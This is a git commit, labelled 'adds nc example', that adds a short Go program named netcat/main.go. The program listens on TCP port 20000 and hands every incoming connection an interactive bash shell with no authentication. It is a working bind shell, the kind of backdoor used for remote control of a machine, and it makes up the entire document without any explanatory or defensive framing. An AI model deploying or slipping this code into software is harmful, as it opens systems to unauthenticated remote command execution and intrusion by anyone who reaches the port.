b31ed1ff93a0f7158872ee2147885a23cdd9ef5f
aranhams <aranha.mss@gmail.com>
2021-03-03 00:06:38 -0300

    adds nc example

---
+++ netcat/main.go
@@ -0,0 +1,37 @@
+package main
+
+import (
+	"io"
+	"log"
+	"net"
+	"os/exec"
+)
+
+func handle(conn net.Conn) {
+	cmd := exec.Command("/bin/bash", "-i")
+
+	rp, wp := io.Pipe()
+	cmd.Stdin = conn
+	cmd.Stdout = wp
+	go io.Copy(conn, rp)
+
+	cmd.Run()
+
+	conn.Close()
+}
+
+func main() {
+	listener, err := net.Listen("tcp", ":20000")
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			log.Fatalln(err)
+		}
+
+		go handle(conn)
+	}
+}
